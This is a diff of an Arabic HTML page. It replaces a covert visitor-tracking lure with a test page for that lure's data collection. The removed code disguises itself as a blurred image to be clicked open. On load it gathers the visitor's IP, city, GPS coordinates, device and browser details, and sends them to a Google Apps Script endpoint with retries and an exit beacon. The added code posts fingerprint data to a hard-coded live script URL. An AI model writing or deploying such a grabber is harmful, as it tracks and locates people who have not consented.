@@ -3,559 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اسم الموقع الذي تريده</title>
+    <title>اختبار الإرسال</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
+            font-family: Arial, sans-serif;
             max-width: 600px;
-            width: 100%;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
-            overflow: hidden;
-            animation: slideUp 0.8s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .header {
-            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
-            color: white;
-            padding: 30px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-            animation: rotate 10s linear infinite;
-        }
-
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .header h1 {
-            font-size: 2em;
-            margin-bottom: 10px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .header p {
-            font-size: 1.1em;
-            opacity: 0.9;
-            position: relative;
-            z-index: 1;
-        }
-
-        .content {
-            padding: 40px;
-            text-align: center;
-        }
-
-        .main-image {
-            width: 100%;
-            max-width: 400px;
-            height: auto;
-            border-radius: 15px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-            margin-bottom: 30px;
-            animation: fadeIn 1s ease-in-out;
-            filter: blur(20px);
-            transition: filter 0.5s ease;
-            display: block;
-        }
-
-        .main-image.clear {
-            filter: blur(0px);
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .status-box {
-            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
-            color: white;
+            margin: 50px auto;
             padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            box-shadow: 0 10px 25px rgba(116, 185, 255, 0.3);
+            background: #f5f5f5;
         }
-
-        .status-text {
-            font-size: 1.2em;
-            font-weight: bold;
-            margin-bottom: 10px;
+        .test-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
         }
-
-        .status-text.clickable {
-            cursor: pointer;
-            color: #ffffff;
-            text-decoration: underline;
-            transition: all 0.3s ease;
-            padding: 10px;
-            border-radius: 8px;
-            background: rgba(255,255,255,0.1);
-        }
-
-        .status-text.clickable:hover {
-            background: rgba(255,255,255,0.2);
-            transform: translateY(-2px);
-        }
-
-        .view-button {
-            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+        button {
+            background: #4CAF50;
             color: white;
-            border: none;
             padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2em;
-            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .status {
             margin: 20px 0;
-            transition: all 0.3s ease;
-            display: none;
-        }
-
-        .view-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
-        }
-
-        .view-button.show {
-            display: inline-block;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .success-icon {
-            color: #00b894;
-            font-size: 1.5em;
-            margin-left: 10px;
-        }
-
-        .info-panel {
-            background: rgba(255,255,255,0.1);
             padding: 15px;
-            border-radius: 10px;
-            margin-top: 15px;
-            font-size: 0.9em;
-            text-align: right;
+            border-radius: 5px;
             display: none;
         }
-
-        .info-panel.show {
-            display: block;
-            animation: fadeIn 0.5s ease-in-out;
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
-
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .header h1 {
-                font-size: 1.8em;
-            }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            text-align: left;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>اسم الموقع الذي تريده</h1>
-            <p>وصف الموقع أو الشعار الذي تريده</p>
+    <div class="test-box">
+        <h1>🔧 اختبار الاتصال المباشر</h1>
+        <p>هذه الصفحة لاختبار الإرسال إلى Google Sheets</p>
+        
+        <div>
+            <label for="scriptUrl">رابط Google Apps Script:</label><br>
+            <input type="text" id="scriptUrl" style="width: 100%; padding: 10px; margin: 10px 0;" 
+                   value="https://script.google.com/macros/s/AKfycbyAnQqHdzYjEfZdW4DJbSen8H6dz2nLJuWZVwx6TzfoE4nfa2fxRDxb6xP8BxW2uPnS/exec">
         </div>
-
-        <div class="content">
-            <img src="https://i.imgur.com/zcb3oRL.jpeg" 
-                 alt="الصورة المختارة" 
-                 class="main-image" 
-                 id="mainImage">
-
-            <div class="status-box">
-                <div class="status-text" id="statusText">
-                    <span class="loading" id="loadingSpinner"></span>
-                </div>
-                
-                <div class="info-panel" id="infoPanel">
-                    <p><strong>📍 الموقع:</strong> <span id="locationText">غير متاح</span></p>
-                    <p><strong>🌐 عنوان IP:</strong> <span id="ipAddress">جاري التحميل...</span></p>
-                    <p><strong>📱 الجهاز:</strong> <span id="deviceInfo">--</span></p>
-                    <p><strong>🌍 المتصفح:</strong> <span id="browserInfo">--</span></p>
-                    <p><strong>🕐 المنطقة الزمنية:</strong> <span id="timezone">--</span></p>
-                    <p><strong>📺 دقة الشاشة:</strong> <span id="screenRes">--</span></p>
-                </div>
-            </div>
-
-            <button class="view-button" id="viewButton" onclick="viewImageAndSendData()">
-                🔍 مشاهدة الصورة الآن
-            </button>
-
-            <!-- زر اختبار مخفي للتشخيص -->
-            <button onclick="testConnection()" style="background: #ff6b6b; color: white; padding: 10px; border: none; border-radius: 5px; margin: 10px; cursor: pointer;">
-                🔧 اختبار الاتصال
-            </button>
-        </div>
+        
+        <button onclick="testConnection()">🚀 اختبار الاتصال</button>
+        <button onclick="sendRealData()">📤 إرسال بيانات حقيقية</button>
+        <button onclick="clearLog()">🗑️ مسح السجل</button>
+        
+        <div id="status" class="status"></div>
+        <div id="log" class="log"></div>
     </div>
 
     <script>
-        const GOOGLE_SCRIPT_URL = 'ضع_رابط_Google_Apps_Script_هنا';
-        
-        let userInfo = {
-            timestamp: new Date().toLocaleString('ar-IQ'),
-            page_url: window.location.href,
-            referrer: document.referrer || 'مباشر'
-        };
+        let logContent = '';
 
-        // جمع معلومات الجهاز والمتصفح
-        function collectDeviceInfo() {
-            const ua = navigator.userAgent;
-            
-            // نوع الجهاز
-            let deviceType = 'كمبيوتر';
-            if (/Mobile|Android|iPhone|iPad/.test(ua)) {
-                deviceType = 'جهاز محمول';
-            } else if (/Tablet|iPad/.test(ua)) {
-                deviceType = 'تابلت';
-            }
-            
-            // نوع المتصفح
-            let browser = 'غير معروف';
-            if (ua.includes('Chrome')) browser = 'كروم';
-            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
-            else if (ua.includes('Safari')) browser = 'سفاري';
-            else if (ua.includes('Edge')) browser = 'إيدج';
-            
-            // نظام التشغيل
-            let os = 'غير معروف';
-            if (ua.includes('Windows')) os = 'ويندوز';
-            else if (ua.includes('Mac')) os = 'ماك';
-            else if (ua.includes('Linux')) os = 'لينكس';
-            else if (ua.includes('Android')) os = 'أندرويد';
-            else if (ua.includes('iOS')) os = 'iOS';
-            
-            userInfo.device_type = deviceType;
-            userInfo.browser = browser;
-            userInfo.operating_system = os;
-            userInfo.user_agent = ua;
-            userInfo.screen_resolution = `${screen.width}x${screen.height}`;
-            userInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            userInfo.language = navigator.language || 'غير معروف';
-            
-            // تحديث الواجهة
-            document.getElementById('deviceInfo').textContent = `${deviceType} (${os})`;
-            document.getElementById('browserInfo').textContent = browser;
-            document.getElementById('screenRes').textContent = userInfo.screen_resolution;
-            document.getElementById('timezone').textContent = userInfo.timezone;
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString('ar-IQ');
+            logContent += `[${timestamp}] ${message}\n`;
+            document.getElementById('log').textContent = logContent;
+            console.log(message);
         }
 
-        // الحصول على عنوان IP
-        async function getIPAddress() {
+        function showStatus(message, isError = false) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = isError ? 'status error' : 'status success';
+            statusDiv.style.display = 'block';
+        }
+
+        function clearLog() {
+            logContent = '';
+            document.getElementById('log').textContent = '';
+            document.getElementById('status').style.display = 'none';
+        }
+
+        async function testConnection() {
+            const scriptUrl = document.getElementById('scriptUrl').value.trim();
+            
+            if (!scriptUrl) {
+                showStatus('الرجاء إدخال رابط Google Apps Script', true);
+                return;
+            }
+
+            log('🔍 بدء اختبار الاتصال...');
+            log('🔗 الرابط: ' + scriptUrl);
+
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userInfo.ip_address = data.ip;
-                document.getElementById('ipAddress').textContent = data.ip;
-                
-                // محاولة الحصول على معلومات الموقع من IP
-                try {
-                    const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                    const geoData = await geoResponse.json();
-                    userInfo.ip_location = `${geoData.city || 'غير معروف'}, ${geoData.country_name || 'غير معروف'}`;
-                } catch (e) {
-                    userInfo.ip_location = 'غير متاح';
-                }
-            } catch (error) {
-                userInfo.ip_address = 'غير متاح';
-                document.getElementById('ipAddress').textContent = 'غير متاح';
-            }
-        }
+                // اختبار GET أولاً
+                log('📡 اختبار GET request...');
+                const getResponse = await fetch(scriptUrl, { method: 'GET' });
+                const getResult = await getResponse.text();
+                log('✅ GET response: ' + getResult);
 
-        // الحصول على الموقع الجغرافي
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async function(position) {
-                        userInfo.latitude = position.coords.latitude;
-                        userInfo.longitude = position.coords.longitude;
-                        userInfo.accuracy = position.coords.accuracy;
-                        userInfo.location_status = 'تم الحصول عليه';
-                        
-                        document.getElementById('statusText').innerHTML = `
-                            اضغط هنا لمشاهدة الصورة
-                        `;
-                        document.getElementById('statusText').classList.add('clickable');
-                        document.getElementById('statusText').onclick = viewImageAndSendData;
-                        document.getElementById('loadingSpinner').style.display = 'none';
-                        document.getElementById('locationText').textContent = 
-                            `${userInfo.latitude.toFixed(4)}, ${userInfo.longitude.toFixed(4)}`;
-                        
-                        // إظهار معلومات مفصلة فقط
-                        document.getElementById('infoPanel').classList.add('show');
-                    },
-                    function(error) {
-                        userInfo.location_status = 'مرفوض';
-                        userInfo.location_error = 'رفض المستخدم';
-                        
-                        document.getElementById('statusText').innerHTML = `
-                            اضغط هنا لمشاهدة الصورة
-                        `;
-                        document.getElementById('statusText').classList.add('clickable');
-                        document.getElementById('statusText').onclick = viewImageAndSendData;
-                        document.getElementById('loadingSpinner').style.display = 'none';
-                        document.getElementById('locationText').textContent = 'غير متاح (مرفوض)';
-                        
-                        // إظهار المعلومات المتاحة فقط
-                        document.getElementById('infoPanel').classList.add('show');
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                userInfo.location_status = 'غير مدعوم';
-                document.getElementById('statusText').innerHTML = 'اضغط هنا لمشاهدة الصورة';
-                document.getElementById('statusText').classList.add('clickable');
-                document.getElementById('statusText').onclick = viewImageAndSendData;
-                document.getElementById('loadingSpinner').style.display = 'none';
-                document.getElementById('locationText').textContent = 'غير مدعوم';
-                document.getElementById('infoPanel').classList.add('show');
-            }
-        }
+                // اختبار POST
+                log('📤 اختبار POST request...');
+                const testData = {
+                    test: true,
+                    timestamp: new Date().toLocaleString('ar-IQ'),
+                    page_url: 'صفحة الاختبار المباشر',
+                    user_agent: navigator.userAgent,
+                    test_id: 'DIRECT_TEST_' + Date.now()
+                };
 
-        // مشاهدة الصورة وإرسال البيانات (محسن للموبايل)
-        async function viewImageAndSendData() {
-            // إظهار الصورة واضحة
-            document.getElementById('mainImage').classList.add('clear');
-            
-            // تحديث النص
-            document.getElementById('statusText').innerHTML = `
-                جاري إرسال البيانات...
-                <span class="loading"></span>
-            `;
-            document.getElementById('statusText').classList.remove('clickable');
-            document.getElementById('statusText').onclick = null;
-            
-            // تحديث معلومات المشاهدة
-            userInfo.image_viewed = true;
-            userInfo.view_timestamp = new Date().toLocaleString('ar-IQ');
-            userInfo.device_type = userInfo.device_type || 'غير معروف';
-            userInfo.browser = userInfo.browser || 'غير معروف';
-            
-            console.log('البيانات النهائية للإرسال:', userInfo);
-            
-            // محاولة إرسال البيانات عدة مرات
-            let sent = false;
-            for (let attempt = 1; attempt <= 3; attempt++) {
-                console.log(`محاولة الإرسال ${attempt}/3`);
-                
-                sent = await sendData(userInfo);
-                
-                if (sent) {
-                    console.log(`نجح الإرسال في المحاولة ${attempt}`);
-                    break;
-                }
-                
-                // انتظار قبل المحاولة التالية
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-            
-            // تحديث الواجهة
-            if (sent) {
-                document.getElementById('statusText').innerHTML = `
-                    تم الموافقة على عرض الصورة 
-                    <span class="success-icon">✓</span>
-                `;
-            } else {
-                document.getElementById('statusText').innerHTML = `
-                    تم عرض الصورة 
-                    <span class="success-icon">✓</span>
-                `;
-                
-                // محاولة أخيرة باستخدام sendBeacon
-                if (navigator.sendBeacon) {
-                    console.log('محاولة أخيرة باستخدام sendBeacon');
-                    navigator.sendBeacon(
-                        GOOGLE_SCRIPT_URL, 
-                        'data=' + encodeURIComponent(JSON.stringify(userInfo))
-                    );
-                }
-            }
-        }
+                log('📦 البيانات المرسلة: ' + JSON.stringify(testData, null, 2));
 
-        // مشاهدة الصورة وإرسال البيانات (دالة قديمة - للحذف)
-        async function viewImage() {
-            // تم استبدالها بالدالة الجديدة أعلاه
-        }
+                const formData = 'data=' + encodeURIComponent(JSON.stringify(testData));
+                log('📝 Form data length: ' + formData.length + ' characters');
 
-        // إرسال البيانات (مبسط ومحسن)
-        async function sendData(data) {
-            console.log('🚀 بدء إرسال البيانات...');
-            console.log('📦 البيانات:', data);
-            console.log('🔗 الرابط:', GOOGLE_SCRIPT_URL);
-            
-            // إضافة معرف فريد لتتبع الطلب
-            data.send_timestamp = new Date().toISOString();
-            data.random_id = Math.random().toString(36).substr(2, 9);
-            
-            try {
-                // الطريقة الأولى: POST with form encoding
-                console.log('📤 محاولة POST...');
-                
-                const formBody = 'data=' + encodeURIComponent(JSON.stringify(data));
-                console.log('📝 Form body:', formBody.substring(0, 100) + '...');
-                
-                const response = await fetch(GOOGLE_SCRIPT_URL, {
+                const postResponse = await fetch(scriptUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
-                    body: formBody,
-                    mode: 'no-cors'
+                    body: formData
                 });
+
+                log('📬 POST status: ' + postResponse.status);
                 
-                console.log('✅ POST completed');
-                
-                // محاولة ثانية بـ GET كنسخة احتياطية
-                setTimeout(async () => {
-                    try {
-                        console.log('📤 محاولة GET احتياطية...');
-                        const getUrl = GOOGLE_SCRIPT_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
-                        await fetch(getUrl, { method: 'GET', mode: 'no-cors' });
-                        console.log('✅ GET backup completed');
-                    } catch (e) {
-                        console.log('❌ GET backup failed:', e);
-                    }
-                }, 1000);
-                
-                return true;
-                
-            } catch (error) {
-                console.error('❌ POST failed:', error);
-                
-                // محاولة بـ navigator.sendBeacon
                 try {
-                    console.log('📤 محاولة sendBeacon...');
-                    const formBody = 'data=' + encodeURIComponent(JSON.stringify(data));
-                    const success = navigator.sendBeacon(GOOGLE_SCRIPT_URL, formBody);
-                    console.log('📡 sendBeacon result:', success);
-                    return success;
+                    const postResult = await postResponse.text();
+                    log('✅ POST response: ' + postResult);
                 } catch (e) {
-                    console.error('❌ sendBeacon failed:', e);
+                    log('⚠️ Could not read POST response (this is normal with no-cors)');
                 }
-                
-                return false;
+
+                showStatus('✅ تم الاختبار بنجاح! تحقق من Google Sheet');
+
+            } catch (error) {
+                log('❌ خطأ في الاختبار: ' + error.message);
+                showStatus('❌ فشل الاختبار: ' + error.message, true);
             }
         }
 
-        // تشغيل الكود عند تحميل الصفحة
-        window.addEventListener('load', function() {
-            // جمع معلومات الجهاز مباشرة
-            collectDeviceInfo();
+        async function sendRealData() {
+            const scriptUrl = document.getElementById('scriptUrl').value.trim();
             
-            // الحصول على عنوان IP
-            getIPAddress();
-            
-            // اختبار فوري للاتصال
-            testConnection();
-            
-            // محاولة الحصول على الموقع الجغرافي
-            setTimeout(getLocation, 1000);
-        });
+            if (!scriptUrl) {
+                showStatus('الرجاء إدخال رابط Google Apps Script', true);
+                return;
+            }
 
-        // اختبار الاتصال فوراً مع عرض النتائج
-        async function testConnection() {
-            const testData = {
-                test: true,
+            log('🚀 إرسال بيانات حقيقية...');
+
+            // جمع معلومات حقيقية
+            const data = {
                 timestamp: new Date().toLocaleString('ar-IQ'),
                 page_url: window.location.href,
+                referrer: document.referrer || 'مباشر',
+                device_type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر',
+                browser: getBrowser(),
+                operating_system: getOS(),
+                screen_resolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
                 user_agent: navigator.userAgent,
-                test_id: 'WEB_TEST_' + Date.now()
+                test_id: 'REAL_DATA_' + Date.now()
             };
-            
-            console.log('🔍 اختبار الاتصال...');
-            console.log('📤 البيانات المرسلة:', testData);
-            console.log('🔗 الرابط المستخدم:', GOOGLE_SCRIPT_URL);
-            
+
+            log('📊 البيانات الحقيقية: ' + JSON.stringify(data, null, 2));
+
             try {
-                const result = await sendData(testData);
-                console.log('✅ نتيجة اختبار الاتصال:', result);
+                const formData = 'data=' + encodeURIComponent(JSON.stringify(data));
                 
-                // عرض النتيجة للمستخدم
-                if (result) {
-                    alert('✅ نجح الاتصال! تحقق من Google Sheet');
-                } else {
-                    alert('❌ فشل الاتصال! تحقق من Console');
-                }
+                const response = await fetch(scriptUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: formData
+                });
+
+                log('✅ تم إرسال البيانات الحقيقية');
+                showStatus('✅ تم إرسال البيانات الحقيقية! تحقق من Google Sheet');
+
+                // محاولة إضافية بـ GET
+                setTimeout(async () => {
+                    try {
+                        const getUrl = scriptUrl + '?data=' + encodeURIComponent(JSON.stringify(data));
+                        await fetch(getUrl, { method: 'GET' });
+                        log('✅ تم إرسال نسخة احتياطية بـ GET');
+                    } catch (e) {
+                        log('⚠️ فشلت النسخة الاحتياطية: ' + e.message);
+                    }
+                }, 1000);
+
             } catch (error) {
-                console.error('❌ خطأ في الاختبار:', error);
-                alert('❌ خطأ: ' + error.message);
+                log('❌ خطأ في إرسال البيانات: ' + error.message);
+                showStatus('❌ فشل الإرسال: ' + error.message, true);
             }
         }
 
-        // إرسال بيانات المغادرة
-        window.addEventListener('beforeunload', function() {
-            const exitData = {
-                ...userInfo,
-                action: 'page_exit',
-                exit_time: new Date().toLocaleString('ar-IQ')
-            };
-            navigator.sendBeacon(GOOGLE_SCRIPT_URL, 'data=' + encodeURIComponent(JSON.stringify(exitData)));
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'كروم';
+            if (ua.includes('Firefox')) return 'فايرفوكس';
+            if (ua.includes('Safari')) return 'سفاري';
+            if (ua.includes('Edge')) return 'إيدج';
+            return 'غير معروف';
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'ويندوز';
+            if (ua.includes('Mac')) return 'ماك';
+            if (ua.includes('Linux')) return 'لينكس';
+            if (ua.includes('Android')) return 'أندرويد';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'غير معروف';
+        }
+
+        // تشغيل اختبار تلقائي عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            log('🏁 تم تحميل صفحة الاختبار');
+            log('🌐 الرابط الحالي: ' + window.location.href);
+            log('📱 نوع الجهاز: ' + (/Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر'));
+            log('🔧 جاهز للاختبار!');
         });
     </script>
 </body>
